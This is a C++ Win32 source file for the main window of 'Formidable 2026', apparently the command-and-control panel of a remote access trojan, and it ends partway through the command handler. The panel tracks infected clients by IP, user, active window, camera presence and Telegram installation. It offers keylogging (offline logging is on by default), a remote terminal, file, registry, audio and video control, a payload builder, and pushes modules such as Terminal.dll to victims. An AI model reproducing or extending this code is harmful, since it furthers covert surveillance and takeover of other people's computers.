#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
/**
 * MainWindow.cpp - 主窗口过程和UI控制
 * Encoding: UTF-8 BOM
 * 从main_gui.cpp提取，约800行
 */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include <winsock2.h>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>
#include <commdlg.h>
#include <uxtheme.h>
#pragma comment(lib, "uxtheme.lib")
#include <ctime>
#include <fstream>
#include <gdiplus.h>
#include "resource.h"
#include "../Common/ClientTypes.h"
#include "../Common/Config.h"
#include "../Common/Utils.h"
#include "GlobalState.h"
#include "StringUtils.h"
#include "MainWindow.h"
#include "NetworkHelper.h"
#include "Config.h"
#include "UI/TerminalDialog.h"
#include "UI/HistoryDialog.h"
#include "UI/ProcessDialog.h"
#include "UI/NetworkDialog.h"
#include "UI/FileDialog.h"
#include "UI/DesktopDialog.h"
#include "UI/RegistryDialog.h"
#include "UI/AudioDialog.h"
#include "UI/VideoDialog.h"
#include "UI/BackgroundDialog.h"
#include "UI/InputDialog.h"
#include "UI/SettingsDialog.h"
#include "UI/BuilderDialog.h"
#include "Utils/StringHelper.h"
#include "Server/Utils/Logger.h"
#include <uxtheme.h>
#pragma comment(lib, "uxtheme.lib")

using namespace Formidable;
using namespace Formidable::Utils;
using namespace Gdiplus;

static int s_toolbarHotId = -1;

static Color MakeColor(BYTE a, COLORREF c) {
    return Color(a, GetRValue(c), GetGValue(c), GetBValue(c));
}

static void BuildRoundRect(GraphicsPath& path, const RectF& rc, float radius) {
    float d = radius * 2.0f;
    path.AddArc(rc.X, rc.Y, d, d, 180.0f, 90.0f);
    path.AddArc(rc.X + rc.Width - d, rc.Y, d, d, 270.0f, 90.0f);
    path.AddArc(rc.X + rc.Width - d, rc.Y + rc.Height - d, d, d, 0.0f, 90.0f);
    path.AddArc(rc.X, rc.Y + rc.Height - d, d, d, 90.0f, 90.0f);
    path.CloseFigure();
}

static void FillRoundRect(Graphics& g, const RectF& rc, float radius, const Color& color) {
    GraphicsPath path;
    BuildRoundRect(path, rc, radius);
    SolidBrush brush(color);
    g.FillPath(&brush, &path);
}

static std::wstring NormalizeIpText(const std::string& ip) {
    std::string trimmed = StringHelper::Trim(ip);
    if (trimmed.empty()) return L"";
    std::string clean;
    clean.reserve(trimmed.size());
    for (unsigned char c : trimmed) {
        if ((c >= '0' && c <= '9') || c == '.' || c == ':' || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
            clean.push_back((char)c);
        }
    }
    if (!clean.empty()) return UTF8ToWide(clean);
    return StringHelper::ANSIToWide(trimmed);
}

static LRESULT HandleToolbarCustomDraw(HWND hToolbar, NMTBCUSTOMDRAW* cd) {
    if (cd->nmcd.dwDrawStage == CDDS_PREPAINT) {
        return CDRF_NOTIFYITEMDRAW;
    }
    if (cd->nmcd.dwDrawStage == CDDS_ITEMPREPAINT) {
        HDC hdc = cd->nmcd.hdc;
        RECT rc = cd->nmcd.rc;
        
        // Double buffering to prevent flickering
        HDC hMemDC = CreateCompatibleDC(hdc);
        HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, rc.right - rc.left, rc.bottom - rc.top);
        HBITMAP hOldBmp = (HBITMAP)SelectObject(hMemDC, hMemBmp);
        
        // Adjust rect for memory DC (start at 0,0)
        RECT rcMem = rc;
        OffsetRect(&rcMem, -rc.left, -rc.top);
        
        // Fill background with toolbar color
        HBRUSH hBr = GetSysColorBrush(COLOR_BTNFACE);
        FillRect(hMemDC, &rcMem, hBr);
        
        Graphics g(hMemDC);
        g.SetSmoothingMode(SmoothingModeAntiAlias);
        COLORREF accent = GetSysColor(COLOR_HIGHLIGHT);
        bool hot = (cd->nmcd.uItemState & CDIS_HOT) != 0 || (int)cd->nmcd.dwItemSpec == s_toolbarHotId;
        bool pressed = (cd->nmcd.uItemState & CDIS_SELECTED) != 0;
        
        if (hot || pressed) {
            RectF shadowRect((REAL)rcMem.left + 1.0f, (REAL)rcMem.top + 2.0f, (REAL)(rcMem.right - rcMem.left - 2), (REAL)(rcMem.bottom - rcMem.top - 3));
            FillRoundRect(g, shadowRect, 8.0f, MakeColor(28, RGB(0, 0, 0)));
            RectF fillRect((REAL)rcMem.left + 1.0f, (REAL)rcMem.top + 1.0f, (REAL)(rcMem.right - rcMem.left - 2), (REAL)(rcMem.bottom - rcMem.top - 2));
            FillRoundRect(g, fillRect, 8.0f, MakeColor(pressed ? 70 : 40, accent));
        }
        
        int cmdId = (int)cd->nmcd.dwItemSpec;
        int index = (int)SendMessageW(hToolbar, TB_COMMANDTOINDEX, cmdId, 0);
        TBBUTTON btn = { 0 };
        SendMessageW(hToolbar, TB_GETBUTTON, index, (LPARAM)&btn);
        HIMAGELIST hImg = (HIMAGELIST)SendMessageW(hToolbar, TB_GETIMAGELIST, 0, 0);
        int iconSize = 32;
        int paddingTop = 6;
        int iconX = rcMem.left + (rcMem.right - rcMem.left - iconSize) / 2;
        int iconY = rcMem.top + paddingTop;
        
        if (hImg) {
            ImageList_Draw(hImg, btn.iBitmap, hMemDC, iconX, iconY, ILD_NORMAL);
        }
        
        wchar_t text[64] = { 0 };
        SendMessageW(hToolbar, TB_GETBUTTONTEXTW, cmdId, (LPARAM)text);
        HFONT hFont = (HFONT)SendMessageW(hToolbar, WM_GETFONT, 0, 0);
        HFONT hOldFont = (HFONT)SelectObject(hMemDC, hFont);
        SetBkMode(hMemDC, TRANSPARENT);
        SetTextColor(hMemDC, GetSysColor(COLOR_BTNTEXT));
        RECT rcText = rcMem;
        rcText.top = iconY + iconSize + 2;
        DrawTextW(hMemDC, text, -1, &rcText, DT_CENTER | DT_SINGLELINE | DT_VCENTER);
        SelectObject(hMemDC, hOldFont);
        
        // Copy back to screen
        BitBlt(hdc, rc.left, rc.top, rc.right - rc.left, rc.bottom - rc.top, hMemDC, 0, 0, SRCCOPY);
        
        SelectObject(hMemDC, hOldBmp);
        DeleteObject(hMemBmp);
        DeleteDC(hMemDC);
        
        return CDRF_SKIPDEFAULT;
    }
    return CDRF_DODEFAULT;
}

static LRESULT HandleTabCustomDraw(HWND hTab, NMCUSTOMDRAW* cd) {
    if (cd->dwDrawStage == CDDS_PREPAINT) {
        return CDRF_NOTIFYITEMDRAW;
    }
    if (cd->dwDrawStage == CDDS_ITEMPREPAINT) {
        HDC hdc = cd->hdc;
        int index = (int)cd->dwItemSpec;
        RECT rc;
        TabCtrl_GetItemRect(hTab, index, &rc);
        Graphics g(hdc);
        g.SetSmoothingMode(SmoothingModeAntiAlias);
        COLORREF accent = GetSysColor(COLOR_HIGHLIGHT);
        int curSel = TabCtrl_GetCurSel(hTab);
        
        bool selected = curSel == index;
        
        // Win11 Style: Clean background, Blue underline for selected
        SolidBrush bgBrush(Color(255, 255, 255, 255)); // White background
        g.FillRectangle(&bgBrush, rc.left, rc.top, rc.right - rc.left, rc.bottom - rc.top);

        if (selected) {
            // Blue underline
            RectF underline((REAL)rc.left + 8.0f, (REAL)rc.bottom - 3.0f, (REAL)(rc.right - rc.left - 16), 3.0f);
            SolidBrush brush(MakeColor(255, accent));
            g.FillRectangle(&brush, underline);
        }

        wchar_t text[128] = { 0 };
        TCITEMW item = { 0 };
        item.mask = TCIF_TEXT;
        item.pszText = text;
        item.cchTextMax = 128;
        TabCtrl_GetItem(hTab, index, &item);
        
        HFONT hFont = (HFONT)SendMessageW(hTab, WM_GETFONT, 0, 0);
        LOGFONTW lf;
        GetObjectW(hFont, sizeof(lf), &lf);
        if (selected) lf.lfWeight = FW_BOLD; // Bold for selected
        HFONT hNewFont = CreateFontIndirectW(&lf);
        HFONT hOld = (HFONT)SelectObject(hdc, hNewFont);
        
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, selected ? accent : GetSysColor(COLOR_BTNTEXT)); // Colored text for selected
        
        RECT rcText = rc;
        rcText.top += 2; // Slight adjustment
        DrawTextW(hdc, text, -1, &rcText, DT_CENTER | DT_SINGLELINE | DT_VCENTER);
        
        SelectObject(hdc, hOld);
        DeleteObject(hNewFont);
        
        return CDRF_SKIPDEFAULT;
    }
    return CDRF_DODEFAULT;
}

// 从main_gui.cpp提取：菜单创建
void CreateMainMenu(HWND hWnd) {
    HMENU hMenu = CreateMenu();
    HMENU hSubMenu;
    
    // 菜单(&F)
    hSubMenu = CreatePopupMenu();
    AppendMenuW(hSubMenu, MF_STRING, IDM_MENU_SET, L"设置(&S)");
    AppendMenuW(hSubMenu, MF_SEPARATOR, 0, NULL);
    AppendMenuW(hSubMenu, MF_STRING, 101, L"退出(&Q)");
    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"菜单(&F)");
    
    // 工具(&T)
    hSubMenu = CreatePopupMenu();
    AppendMenuW(hSubMenu, MF_STRING, IDM_TOOL_RELOAD_PLUGINS, L"刷新插件(&P)");
    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"工具(&T)");
    
    // 参数(&P)
    hSubMenu = CreatePopupMenu();
    AppendMenuW(hSubMenu, MF_STRING, IDM_PARAM_KBLOGGER, L"键盘记录");
    AppendMenuW(hSubMenu, MF_STRING | MF_CHECKED, IDM_PARAM_OFFLINE_KEYLOG, L"离线记录");  // 默认勾选
    AppendMenuW(hSubMenu, MF_STRING, IDM_PARAM_LOGIN_NOTIFY, L"上线提醒");
    AppendMenuW(hSubMenu, MF_STRING, IDM_PARAM_ENABLE_LOG, L"启用日志");
    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"参数(&P)");
    
    // 扩展(&X)
    hSubMenu = CreatePopupMenu();
    AppendMenuW(hSubMenu, MF_STRING, IDM_EXTEND_HISTORY, L"历史主机(&C)");
    AppendMenuW(hSubMenu, MF_STRING, IDM_EXTEND_BACKUP, L"迁移数据(&D)");
    AppendMenuW(hSubMenu, MF_STRING, IDM_EXTEND_IMPORT, L"导入数据(&I)");
    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"扩展(&X)");
    
    // 帮助(&H)
    hSubMenu = CreatePopupMenu();
    AppendMenuW(hSubMenu, MF_STRING, IDM_HELP, L"关于");
    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"帮助(&H)");
    
    SetMenu(hWnd, hMenu);
}

// 从main_gui.cpp提取：工具栏创建  
void CreateMainToolbar(HWND hWnd) {
    g_hToolbar = CreateWindowExW(0, TOOLBARCLASSNAMEW, NULL,
        WS_CHILD | WS_VISIBLE | TBSTYLE_FLAT | TBSTYLE_TOOLTIPS | CCS_TOP | TBSTYLE_WRAPABLE,
        0, 0, 0, 0, hWnd, (HMENU)IDC_TOOLBAR, g_hInstance, NULL);
    SendMessage(g_hToolbar, TB_BUTTONSTRUCTSIZE, (WPARAM)sizeof(TBBUTTON), 0);
    SendMessage(g_hToolbar, TB_SETBITMAPSIZE, 0, MAKELPARAM(32, 32));
    HIMAGELIST hImageList = ImageList_Create(32, 32, ILC_COLOR32 | ILC_MASK, 14, 1);
    SendMessage(g_hToolbar, TB_SETIMAGELIST, 0, (LPARAM)hImageList);
    
    int iconIds[] = {
        IDI_TERMINAL, IDI_PROCESS, IDI_NETWORK, IDI_WINDOW, IDI_DESKTOP, IDI_DESKTOP, IDI_FILE,
        IDI_AUDIO, IDI_VIDEO, IDI_SERVICE, IDI_REGISTRY, IDI_KEYLOGGER,
        IDI_SETTINGS, IDI_HISTORY, IDI_BUILDER, IDI_HELP
    };

    const wchar_t* buttonTexts[] = {
        L"终端", L"进程", L"网络", L"窗口", L"桌面", L"后台", L"文件",
        L"语音", L"视频", L"服务", L"注册表", L"键盘记录",
        L"设置", L"历史主机", L"生成", L"帮助"
    };
    int ids[] = {
        IDM_TERMINAL, IDM_PROCESS, IDM_NETWORK, IDM_WINDOW, IDM_DESKTOP, IDM_BACKGROUND, IDM_FILE,
        IDM_AUDIO, IDM_VIDEO, IDM_SERVICE, IDM_REGISTRY, IDM_KEYLOGGER,
        IDM_SETTINGS, IDM_EXTEND_HISTORY, IDM_BUILDER, IDM_HELP
    };

    for (int i = 0; i < 16; i++) {
        HICON hIcon = (HICON)LoadImageW(g_hInstance, MAKEINTRESOURCEW(iconIds[i]), IMAGE_ICON, 32, 32, LR_DEFAULTCOLOR);
        if (hIcon) {
            ImageList_AddIcon(hImageList, hIcon);
            DestroyIcon(hIcon);
        }
    }

    TBBUTTON tbButtons[16];
    for (int i = 0; i < 16; i++) {
        ZeroMemory(&tbButtons[i], sizeof(TBBUTTON));
        tbButtons[i].iBitmap = i;
        tbButtons[i].idCommand = ids[i];
        tbButtons[i].fsState = TBSTATE_ENABLED;
        tbButtons[i].fsStyle = BTNS_AUTOSIZE | BTNS_SHOWTEXT;
        tbButtons[i].iString = (INT_PTR)buttonTexts[i];
    }
    SendMessage(g_hToolbar, TB_ADDBUTTONS, 16, (LPARAM)&tbButtons);
    SendMessage(g_hToolbar, TB_AUTOSIZE, 0, 0);
}

// 加载指定分组的客户端列表
void LoadListData(const std::string& group) {
    SendMessageW(g_hListClients, WM_SETREDRAW, FALSE, 0);
    ListView_DeleteAllItems(g_hListClients);
    
    struct ClientSnapshot {
        uint32_t clientId;
        uint16_t port;
        std::string ip;
        std::wstring group;
        std::wstring remark;
        Formidable::ClientInfo info;
    };
    std::vector<ClientSnapshot> snapshots;
    snapshots.reserve(g_Clients.size());

    bool isDefaultGroup = (group == "default" || group == "默认");
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        for (auto& pair : g_Clients) {
            auto& client = pair.second;
            std::string clientGroup = WideToUTF8(client->group);
            bool isClientDefault = (clientGroup.empty() || clientGroup == "default" || clientGroup == "默认");
            if (!((isDefaultGroup && isClientDefault) || clientGroup == group)) {
                continue;
            }
            ClientSnapshot snap = {};
            snap.clientId = client->clientId;
            snap.port = client->port;
            snap.ip = client->ip;
            snap.group = client->group;
            snap.remark = client->remark;
            snap.info = client->info;
            snapshots.push_back(std::move(snap));
        }
    }

    int iCount = 0;
    std::vector<std::pair<uint32_t, int>> listIndexUpdates;
    listIndexUpdates.reserve(snapshots.size());
    for (auto& snap : snapshots) {
        LVITEMW lvi = { 0 };
        lvi.mask = LVIF_TEXT | LVIF_PARAM;
        lvi.iItem = iCount;
        lvi.lParam = (LPARAM)snap.clientId;
        std::wstring wip = NormalizeIpText(snap.ip);
        lvi.pszText = (LPWSTR)wip.c_str();
        int index = ListView_InsertItem(g_hListClients, &lvi);
        listIndexUpdates.push_back(std::make_pair(snap.clientId, index));

        std::wstring wPort = std::to_wstring(snap.port);
        std::wstring wLAN = Utils::StringHelper::UTF8ToWide(snap.info.lanAddr);
        std::wstring wComp = Utils::StringHelper::UTF8ToWide(snap.info.computerName);
        std::wstring wUserGroup = Utils::StringHelper::UTF8ToWide(snap.info.userName) + L"/" + snap.info.group;
        std::wstring wOS = Utils::StringHelper::UTF8ToWide(snap.info.osVersion);
        std::wstring wRTT = std::to_wstring(snap.info.rtt) + L"ms";
        std::wstring wVer = Utils::StringHelper::UTF8ToWide(snap.info.version);
        std::wstring wInst = Utils::StringHelper::UTF8ToWide(snap.info.installTime);
        std::wstring wUptime = Utils::StringHelper::UTF8ToWide(snap.info.uptime);
        std::wstring wActWin = Utils::StringHelper::UTF8ToWide(snap.info.activeWindow);

        ListView_SetItemText(g_hListClients, index, 1, (LPWSTR)wPort.c_str());
        ListView_SetItemText(g_hListClients, index, 2, (LPWSTR)L"正在获取...");
        ListView_SetItemText(g_hListClients, index, 3, (LPWSTR)wLAN.c_str());
        ListView_SetItemText(g_hListClients, index, 4, (LPWSTR)wComp.c_str());
        ListView_SetItemText(g_hListClients, index, 5, (LPWSTR)wUserGroup.c_str());
        ListView_SetItemText(g_hListClients, index, 6, (LPWSTR)wOS.c_str());
        ListView_SetItemText(g_hListClients, index, 7, (LPWSTR)wRTT.c_str());
        ListView_SetItemText(g_hListClients, index, 8, (LPWSTR)wVer.c_str());
        ListView_SetItemText(g_hListClients, index, 9, (LPWSTR)wInst.c_str());
        ListView_SetItemText(g_hListClients, index, 10, (LPWSTR)wUptime.c_str());
        ListView_SetItemText(g_hListClients, index, 11, (LPWSTR)wActWin.c_str());
        ListView_SetItemText(g_hListClients, index, 12, (LPWSTR)snap.remark.c_str());

        std::wstring wCamera = snap.info.hasCamera ? L"是" : L"否";
        std::wstring wTelegram = snap.info.hasTelegram ? L"是" : L"否";
        ListView_SetItemText(g_hListClients, index, 13, (LPWSTR)wCamera.c_str());
        ListView_SetItemText(g_hListClients, index, 14, (LPWSTR)wTelegram.c_str());
        iCount++;
    }

    if (!listIndexUpdates.empty()) {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        for (auto& entry : listIndexUpdates) {
            if (g_Clients.count(entry.first)) {
                g_Clients[entry.first]->listIndex = entry.second;
            }
        }
    }
    
    SendMessageW(g_hListClients, WM_SETREDRAW, TRUE, 0);
    InvalidateRect(g_hListClients, NULL, TRUE);
}

// 从main_gui.cpp提取：状态栏更新
void UpdateStatusBar() {
    int totalClients = 0;
    int activeClients = 0;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        totalClients = (int)g_Clients.size();
        for (const auto& pair : g_Clients) {
            if (pair.second->active) activeClients++;
        }
    }
    
    std::wstring status = L" 在线: " + ToWString(activeClients);
    SendMessageW(g_hStatusBar, SB_SETTEXTW, 0, (LPARAM)status.c_str());
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t timeStr[64];
    swprintf_s(timeStr, 64, L"%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    SendMessageW(g_hStatusBar, SB_SETTEXTW, 1, (LPARAM)timeStr);
    
    std::wstring portInfo = L" 端口: " + ToWString(g_Settings.listenPort);
    SendMessageW(g_hStatusBar, SB_SETTEXTW, 2, (LPARAM)portInfo.c_str());
}

// 从main_gui.cpp提取：关于对话框
void ShowAboutDialog(HWND hWnd) {
    MessageBoxW(hWnd, L"Formidable 2026 Professional Edition\n\n版本: 2026.1.0\n作者: jimmy\n官网: www.formidable2026.com", L"关于 Formidable 2026", MB_OK | MB_ICONINFORMATION);
}

// 从main_gui.cpp提取：获取选中客户端ID
int GetSelectedClientId() {
    int index = ListView_GetNextItem(g_hListClients, -1, LVNI_SELECTED);
    if (index == -1) return -1;
    LVITEMW lvi = { 0 };
    lvi.mask = LVIF_PARAM;
    lvi.iItem = index;
    if (ListView_GetItem(g_hListClients, &lvi)) {
        return (int)lvi.lParam;
    }
    return -1;
}

// 从main_gui.cpp提取：托盘图标
void AddTrayIcon(HWND hWnd) {
    NOTIFYICONDATAW nid = { 0 };
    nid.cbSize = sizeof(NOTIFYICONDATAW);
    nid.hWnd = hWnd;
    nid.uID = 1;
    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_TRAYICON;
    nid.hIcon = LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_MAIN));
    wcscpy_s(nid.szTip, L"Formidable 2026 - Professional Edition");
    Shell_NotifyIconW(NIM_ADD, &nid);
}

void RemoveTrayIcon(HWND hWnd) {
    NOTIFYICONDATAW nid = { 0 };
    nid.cbSize = sizeof(NOTIFYICONDATAW);
    nid.hWnd = hWnd;
    nid.uID = 1;
    Shell_NotifyIconW(NIM_DELETE, &nid);
}

// 从main_gui.cpp提取：开机自启
void EnsureStartupEnabled() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        MessageBoxW(g_hMainWnd, L"无法打开注册表启动项", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (RegSetValueExW(hKey, L"Formidable2026Master", 0, REG_SZ,
        (const BYTE*)exePath, (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t))) == ERROR_SUCCESS) {
        MessageBoxW(g_hMainWnd, L"已设置开机自启动", L"提示", MB_OK | MB_ICONINFORMATION);
    } else {
        MessageBoxW(g_hMainWnd, L"设置开机自启动失败", L"错误", MB_OK | MB_ICONERROR);
    }
    RegCloseKey(hKey);
}

// 从main_gui.cpp提取：重启Master
void RestartMaster(HWND hWnd) {
    if (g_hInstanceMutex) {
        CloseHandle(g_hInstanceMutex);
        g_hInstanceMutex = NULL;
    }
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessW(exePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        MessageBoxW(hWnd, L"重启失败", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    PostMessageW(hWnd, WM_CLOSE, 0, 0);
}

// 从main_gui.cpp提取：ListView初始化
void InitListView(HWND hList) {
    SetWindowTheme(hList, L"Explorer", NULL); // Win11 Style
    const wchar_t* columns[] = { 
        L"IP", L"端口", L"地理位置", L"LAN地址", L"计算机名", 
        L"用户名/组名", L"操作系统", L"RTT", L"版本", 
        L"上线时间", L"运行时长", L"活动窗口", L"备注",
        L"摄像头", L"TG安装"
    };
    int widths[] = { 120, 60, 100, 120, 100, 150, 120, 60, 80, 150, 150, 180, 100, 60, 60 };
    LVCOLUMNW lvc = { 0 };
    lvc.mask = LVCF_TEXT | LVCF_WIDTH;
    for (int i = 0; i < 15; i++) {
        lvc.pszText = (LPWSTR)columns[i];
        lvc.cx = widths[i];
        SendMessageW(hList, LVM_INSERTCOLUMNW, i, (LPARAM)&lvc);
    }
}

static std::wstring GetLogFilePath() {
    wchar_t dir[MAX_PATH] = { 0 };
    wcscpy_s(dir, g_Settings.szConfigPath);
    wchar_t* p = wcsrchr(dir, L'\\');
    if (p) *(p + 1) = L'\0';
    std::wstring path = dir;
    if (path.empty()) path = L".\\";
    path += L"master.log";
    return path;
}

static std::string WideToUtf8(const std::wstring& w) {
    if (w.empty()) return std::string();
    int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), NULL, 0, NULL, NULL);
    if (len <= 0) return std::string();
    std::string out(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &out[0], len, NULL, NULL);
    return out;
}

static void AppendLogFile(const std::wstring& line) {
    std::wstring path = GetLogFilePath();
    std::string utf8 = WideToUtf8(line);
    if (utf8.empty()) return;
    SetLastError(0);
    HANDLE hFile = CreateFileW(path.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    DWORD lastError = GetLastError();
    if (lastError != ERROR_ALREADY_EXISTS) {
        DWORD written = 0;
        unsigned char bom[3] = { 0xEF, 0xBB, 0xBF };
        WriteFile(hFile, bom, 3, &written, NULL);
    }
    DWORD written = 0;
    WriteFile(hFile, utf8.data(), (DWORD)utf8.size(), &written, NULL);
    CloseHandle(hFile);
}

void AddLog(const std::wstring& type, const std::wstring& msg) {
    if (!g_hListLogs) return;

    LVITEMW lvi = { 0 };
    lvi.mask = LVIF_TEXT;
    lvi.pszText = (LPWSTR)type.c_str();
    lvi.iItem = (int)SendMessageW(g_hListLogs, LVM_GETITEMCOUNT, 0, 0);
    
    int index = (int)SendMessageW(g_hListLogs, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
    
    time_t now = time(0);
    struct tm tstruct;
    localtime_s(&tstruct, &now);
    wchar_t timeStr[32];
    wcsftime(timeStr, sizeof(timeStr) / sizeof(wchar_t), L"%H:%M:%S", &tstruct);
    
    LVITEMW lviTime = { 0 };
    lviTime.iItem = index;
    lviTime.iSubItem = 1;
    lviTime.mask = LVIF_TEXT;
    lviTime.pszText = timeStr;
    SendMessageW(g_hListLogs, LVM_SETITEMW, 0, (LPARAM)&lviTime);

    LVITEMW lviMsg = { 0 };
    lviMsg.iItem = index;
    lviMsg.iSubItem = 2;
    lviMsg.mask = LVIF_TEXT;
    lviMsg.pszText = (LPWSTR)msg.c_str();
    SendMessageW(g_hListLogs, LVM_SETITEMW, 0, (LPARAM)&lviMsg);

    SendMessageW(g_hListLogs, LVM_ENSUREVISIBLE, index, FALSE);

    SYSTEMTIME st;
    GetLocalTime(&st);
    wchar_t line[2048];
    swprintf_s(line, L"[%04d-%02d-%02d %02d:%02d:%02d][%s] %s\r\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        type.c_str(), msg.c_str());
    AppendLogFile(line);

    // Integrate with Phase 4 Logger
    std::string logMsg = WideToUtf8(type + L": " + msg);
    Formidable::Server::Utils::Logger::Log(Formidable::Server::Utils::LogLevel::LL_INFO, logMsg);
}

// ---------------------------------------------------------
// HandleCommand - 处理主窗口命令
// ---------------------------------------------------------
void HandleCommand(HWND hWnd, int id) {
    if (id == 101) { // 退出
        DestroyWindow(hWnd);
        return;
    }
    if (id == IDM_HELP) {
        ShowAboutDialog(hWnd);
        return;
    }
    if (id == IDM_TRAY_EXIT) {
        DestroyWindow(hWnd);
        return;
    }
    if (id == IDM_TRAY_STARTUP) {
        EnsureStartupEnabled();
        return;
    }
    if (id == IDM_TRAY_RESTART) {
        RestartMaster(hWnd);
        return;
    }
    // 防止重复选择
    int clientId = -1;
    if (id != IDM_SETTINGS && id != IDM_BUILDER && 
        id != IDM_TOOL_RELOAD_PLUGINS &&
        id != IDM_EXTEND_HISTORY && id != IDM_EXTEND_BACKUP && id != IDM_EXTEND_IMPORT &&
        id != IDM_PARAM_KBLOGGER && id != IDM_PARAM_OFFLINE_KEYLOG &&
        id != IDM_PARAM_LOGIN_NOTIFY && id != IDM_PARAM_ENABLE_LOG) {
        
        clientId = GetSelectedClientId();
        if (clientId == -1) {
            AddLog(L"提示", L"未选中客户端");
            MessageBoxW(hWnd, L"未选中任何客户端", L"提示", MB_OK | MB_ICONWARNING);
            return;
        }
    }
    switch (id) {
    case IDM_TERMINAL:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hTerminalDlg && IsWindow(client->hTerminalDlg)) {
                    ShowWindow(client->hTerminalDlg, SW_SHOW);
                    SetForegroundWindow(client->hTerminalDlg);
                } else {
                    client->hTerminalDlg = UI::TerminalDialog::Show(hWnd, clientId);
                    if (client->hTerminalDlg) ShowWindow(client->hTerminalDlg, SW_SHOW);
                    
                    AddLog(L"操作", L"打开终端...");
                    SendModuleToClient(clientId, CMD_TERMINAL_OPEN, L"Terminal.dll");
                }
            }
        }
        break;
    case IDM_PROCESS:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hProcessDlg && IsWindow(client->hProcessDlg)) {
                    ShowWindow(client->hProcessDlg, SW_SHOW);
                    SetForegroundWindow(client->hProcessDlg);
                } else {
                    client->hProcessDlg = UI::ProcessDialog::Show(hWnd, clientId);
                    if (client->hProcessDlg) ShowWindow(client->hProcessDlg, SW_SHOW);
                    
                    AddLog(L"操作", L"打开进程管理...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"ProcessManager.dll", CMD_PROCESS_LIST);
                }
            }
        }
        break;
    case IDM_NETWORK:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hNetworkDlg && IsWindow(client->hNetworkDlg)) {
                    ShowWindow(client->hNetworkDlg, SW_SHOW);
                    SetForegroundWindow(client->hNetworkDlg);
                } else {
                    client->hNetworkDlg = UI::NetworkDialog::Show(hWnd, clientId);
                    if (client->hNetworkDlg) ShowWindow(client->hNetworkDlg, SW_SHOW);
                    
                    AddLog(L"操作", L"打开网络管理...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"NetworkManager.dll", CMD_NETWORK_LIST);
                }
            }
        }
        break;
    case IDM_WINDOW:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hWindowDlg && IsWindow(client->hWindowDlg)) {
                    ShowWindow(client->hWindowDlg, SW_SHOW);
                    SetForegroundWindow(client->hWindowDlg);
                } else {
                    // TODO: Move WindowDialog to UI namespace if needed
                    // For now, assume it's still in global namespace or Dialogs/
                    extern INT_PTR CALLBACK WindowDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
                    client->hWindowDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_WINDOW), hWnd, WindowDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hWindowDlg, SW_SHOW);
                    
                    AddLog(L"操作", L"打开窗口管理...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"WindowManager.dll", CMD_WINDOW_LIST);
                }
            }
        }
        break;
    case IDM_FILE:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
